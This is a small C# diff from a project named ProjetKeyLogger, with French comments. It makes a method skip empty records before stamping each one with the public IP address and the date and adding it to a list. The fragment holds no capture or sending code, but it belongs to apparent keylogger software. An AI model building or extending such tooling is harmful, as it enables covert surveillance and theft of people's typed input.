@@ -35,14 +35,18 @@ namespace ProjetKeyLogger
         //Ajoute un enregistrement a la collection en initialisant la date et l'adresse
         public void ajouterNew(Enregistrement enregistrement)
         {
-            //On définit l'adresse ip publique
-            enregistrement.adresseIpPublique();
+            //Si l'enregistrement est ni vide ni nulle
+            if (enregistrement.Contenu != null && enregistrement.Contenu != "")
+            {
+                //On définit l'adresse ip publique
+                enregistrement.adresseIpPublique();
 
-            //mise a jour de la date
-            enregistrement.dateTimeNow();
+                //mise a jour de la date
+                enregistrement.dateTimeNow();
 
-            //On ajoute a la liste l'enregistrement courrant
-            list_enregistrement.Add(enregistrement);
+                //On ajoute a la liste l'enregistrement courrant
+                list_enregistrement.Add(enregistrement);
+            }
         }
 
         //Ajoute un enregistrement dont la date et l'adresse sont deja connu et ne doivent pas etre modifier
